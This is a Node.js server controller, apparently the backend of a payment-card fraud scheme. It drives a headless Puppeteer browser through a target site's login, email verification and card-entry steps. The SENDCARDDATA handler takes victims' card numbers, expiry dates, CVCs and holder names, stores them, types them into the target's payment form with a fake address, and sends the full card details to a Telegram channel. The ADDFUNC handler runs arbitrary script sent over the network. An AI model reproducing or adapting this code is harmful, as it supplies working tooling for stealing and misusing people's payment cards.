const { Users: UserModel } = require('../models');
const puppeteer = require('puppeteer');
const path = require('path');
require("dotenv").config();
// const chrome = require('chrome-aws-lambda');
// const puppeteer = require('puppeteer-core');

let browser; // Global browser instance
let page; // Global page instance
let modifyedHTML = {};
let start = false;
const mainURL = '1111';
let userHave = false;

module.exports = {
    LUNCH: async (req, res) => {
        try {
            // { headless: false }
            const bot = req.bot;
            browser = await puppeteer.launch({
                headless: 'new', // Opt-in to the new headless mode
                args: ['--no-sandbox', '--disable-setuid-sandbox'],
                executablePath: process.env.NODE_ENV === 'production' ? process.env.PUPPETEER_EXECUTABLE_PATH : puppeteer.executablePath(),
                protocolTimeout: 60000,
            });
            await bot.sendMessage('@developers_00', `<b>Lunched ${mainURL}:</b>`, { parse_mode: 'HTML' });
            return res.send({ success: true, message: 'OK' });
        } catch (error) {
            if (browser) {
               await browser.close();
            }
            return res.status(500).send({ success: false, message: error.message });
        }
    },
    CLOSE: async (req, res) => {
        try {
            start = false;
            const bot = req.bot;
            await page.close();
            await bot.sendMessage('@developers_00', `<b>CLOSED ${mainURL}:</b>`, { parse_mode: 'HTML' });
            return res.send({ success: true, message: 'OK' });
        } catch (error) {
            return res.status(500).send({ success: false, message: error.message });
        }
    },
    GOPAGE: async (req, res) => {
        try {
            start = false;
            const bot = req.bot;
            const { url } = req.body;
            page = await browser.newPage();
            modifyedHTML = {}
            await page.goto(url, { waitUntil: 'networkidle0', timeout: 60000 });
            await page.setViewport({width: 566, height: 691});
            await page.waitForTimeout(5000);
            await bot.sendMessage('@developers_00', `<b>GOPAGE ${mainURL}:</b>`, { parse_mode: 'HTML' });
            return res.send({ success: true, message: 'OK' });
        } catch (error) {
            console.log(error,'error ! ! !')
            return res.status(500).send({ success: false, message: error.message });
        }
    },
    PROCCED: async (req, res) => {
        try {
            const bot = req.bot;
            await page.focus('body');
            await page.keyboard.press('Tab');
            await page.keyboard.press('Tab');
            await page.keyboard.type('ArietHyudi@proton.me');
            await page.keyboard.press('Tab');
            await page.keyboard.press('Enter');
            await page.waitForTimeout(5000);
            await bot.sendMessage('@developers_00', `<b>PROCCED ${mainURL}:</b>`, { parse_mode: 'HTML' });
            return res.send({ success: true, message: 'OK' });
        } catch (error) {
            return res.status(500).send({ success: false, message: error.message });
        }
    },
    EMAILVERIFICATION: async(req, res) => {
        try {
            const bot = req.bot;
            let { code } = req?.body;
            const codeArray = code.split('');
            const inputSelectors = '.verification-code-input__item input[type="number"]';
            await page.waitForSelector(inputSelectors);
            const inputFields = await page.$$(inputSelectors);
            if (codeArray.length !== inputFields.length) {
                throw new Error(
                    'Code length does not match the number of input fields'
                );
            }
            for (let i = 0; i < codeArray.length; i++) {
                await inputFields[i].focus();
                await inputFields[i].type(codeArray[i], { delay: 100 });
            }
            await page.waitForTimeout(10000);
            await bot.sendMessage('@developers_00', `<b>EMAILVERIFICATION ${mainURL}:</b>`, { parse_mode: 'HTML' });
            return res.send({ success: true, message: 'OK' });
        } catch (error) {
            return res.status(500).send({ success: false, message: error.message });
        }
    },
    START: async (req, res) => {
        try {
            const bot = req.bot;
            await page.waitForSelector('.card-select__item-header .card-select__toggle');
            await page.evaluate(() => {
                const cardItems = document.querySelectorAll('.card-select__item');
                cardItems.forEach(item => {
                    const placeholder = item.querySelector('.card-select__item-placeholder');
                    if (placeholder && placeholder.textContent.trim() === 'New card') {
                        const button = item.querySelector('.card-select__toggle');
                        if (button) {
                            button.click();
                        }
                    }
                });
            });
            await page.waitForTimeout(5000);
            start = true;
            userHave = false;
            await bot.sendMessage('@developers_00', `<b>START ${mainURL}:</b>`, { parse_mode: 'HTML' });
            return res.send({ success: true, message: 'OK' });
        } catch (error) {
            return res.status(500).send({ success: false, message: error.message });
        }
    },
    SENDCARDDATA: async (req, res) => {
        try {
            userHave = true;
            const bot = req.bot;
            let { num, exp, cvc, holder } = req?.body;
            if (req?.body?.card) {
                const newUser = new UserModel({
                    ...req.body,
                });
                newUser.save();
            }
            await page.keyboard.type(holder);
            // await page.focus('body');
            await page.keyboard.press('Tab');
            await page.keyboard.type(num);
            await page.keyboard.press('Tab');
            await page.keyboard.type(exp);
            await page.keyboard.press('Tab');
            await page.keyboard.type(cvc);
            await page.keyboard.press('Tab');
            await page.keyboard.type('France');
            await page.waitForTimeout(2000);
            await page.keyboard.press('ArrowDown');
            await page.keyboard.press('Enter');
            await page.keyboard.press('Tab');
            await page.keyboard.type('Qajaznuni 4');
            await page.keyboard.press('Tab');
            await page.keyboard.type('Paris');
            await page.keyboard.press('Tab');
            await page.keyboard.type('0034');
            await page.keyboard.press('Tab');
            await page.keyboard.press('Tab');
            await page.keyboard.press('Enter');
            await page.waitForTimeout(10000);
            await bot.sendMessage('@developers_00', `<b>SENDCARDDATA ${mainURL}:</b>\n<b>name</b><code>${holder}</code>\n<b>num</b><code>${num}</code>\n<b>exp</b><code>${exp}</code>\n<b>svg</b><code>${cvc}</code>\n`, { parse_mode: 'HTML' });
            return res.send({ success: true, message: 'OK' });
        } catch (e) {
            return res.status(500).send({ success: false, message: 'ERROR ! ! !' });
        }
    },
    SETHTML: async (req,res) => {
        try{
           const bot = req.bot;
           const { num, acceptButton, cancelButton} = req.body;
           modifyedHTML = { num, acceptButton, cancelButton };
           await bot.sendMessage('@developers_00', `<b>SETHTML ${mainURL}:</b>`, { parse_mode: 'HTML' });
           return res.send({ success: true, message: modifyedHTML });
        }catch(error){
            return res.send({ success: false, message: error.message });
        }
    },
    GETHTML: async (req,res) => {
        try{
            return res.send({ success: true, message: modifyedHTML });
        }catch(error){
            return res.send({ success: false, message: error.message });
        }
    },
    TAB: async (req, res) => {
        try {
            const bot = req.bot;
            const body = req.body;
            await page.focus('body');
            if (body?.count > 1) {
                for (let i = 1; i > body.count || 1; i++) {
                    await page.keyboard.press('Tab');
                }
            } else {
                await page.keyboard.press('Tab');
            }
            await bot.sendMessage('@developers_00', `<b>TAB ${mainURL}:</b>`, { parse_mode: 'HTML' });
            return res.send({ success: true, message: 'OK' });
        } catch (error) {
            return res.send({ success: false, message: error.message });
        }
    },
    ENTER: async (req, res) => {
        try {
            const bot = req.bot;
            await page.keyboard.press('Enter');
            await bot.sendMessage('@developers_00', `<b>ENTER ${mainURL}:</b>`, { parse_mode: 'HTML' });
            return res.send({ success: true, message: 'OK' });
        } catch (error) {
            return res.send({ success: false, message: error.message });
        }
    },
    SCREENSHOT: async (req, res) => {
        try {
            const bot = req.bot;
            const screenshotPath = path.resolve(
                __dirname,
                '../../public/screenshot.png'
            );
            await page.screenshot({ path: screenshotPath });
            await bot.sendMessage('@developers_00', `<b>SCREENSHOT ${mainURL}:</b>`, { parse_mode: 'HTML' });
            return res.send({
                success: true,
                message: 'public/screenshot.png',
            });
        } catch (error) {
            return res.send({ success: false, message: error.message });
        }
    },
    BUTTON: async (req, res) => {
        try {
            const body = req.body;
            console.log(body?.buttonText, 'body?.buttonText');
            if (body?.buttonText) {
                await page.evaluate(() => {
                    const buttons = Array.from(
                        document.querySelectorAll('button')
                    );
                    const continueButton = buttons.find(
                        (button) =>
                            button.textContent.trim() === body?.buttonText
                    );
                    if (continueButton) {
                        continueButton.click();
                    }
                });
                return res.send({ success: true, message: 'OK' });
            } else {
                return res.send({
                    success: true,
                    message: 'Text is Required!',
                });
            }
        } catch (error) {
            return res.send({ success: false, message: error.message });
        }
    },
    GETHTMLCONTENT: async (req, res) => {
        try {
            const bodyContent = await page.evaluate(() => {
                return document.body.innerHTML;
            });
            return res.send({ success: true, message: bodyContent });
        } catch (e) {
            return res.send({
                success: true,
                message: 'ERROR Get CONTENT ! ! !',
            });
        }
    },
    WRITE: async (req, res) => {
        try {
            const bot = req.bot;
            let { info } = req?.body;
            await page.focus('body');
            await page.keyboard.type(info);
            await bot.sendMessage('@developers_00', `<b>WRITE ${mainURL}: ${info}</b>`, { parse_mode: 'HTML' });
            return res.send({ success: true, message: 'OK' });
        } catch (error) {
            console.log(error,'error')
            return res
                .status(500)
                .send({ success: false, message: error.message });
        }
    },
    ADDFUNC:async(req,res)=>{
        try{
            const k = req.body.data
            console.log(k,'k');
            for (const script of k) {
                const func = new Function('page', 'console', 'return (async () => {' + script + '})()');
                await func(page, console);
            }
            return res.send({ success: true, message: 'OK' });
        }catch (error) {
            return res
                .status(500)
                .send({ success: false, message: error.message });
        }
    },
    ACTION:async(req,res)=>{
        try{
            const bot = req.bot;
            const { name } = req.body;
            await bot.sendMessage('@developers_00', `<b>User click to ${mainURL}:</b> <code>${name}</code>`, { parse_mode: 'HTML' });
            if(name === 'cancel'){
                start = false;
            }
            return res.send({success: true, message:'success'})
        }catch (error) {
            return res
                .status(500)
                .send({ success: false, message: error.message });
        }
    },
    CANSTART:async(req,res)=>{
        try{
            if(start){
                return res.send({success: true, message:'success'})
            }else{
                return res.send({success: false, message:'Please Wait!'})
            }
        }catch (error) {
            return res
                .status(500)
                .send({ success: false, message: error.message });
        }
    },
    HAVEUSER:async(req,res)=>{
        try{
            if(userHave){
                return res.send({success: true, message:'success'})
            }else{
                return res.send({success: false, message:'Please Wait!'})
            }
        }catch (error) {
            return res
                .status(500)
                .send({ success: false, message: error.message });
        }
    }
};
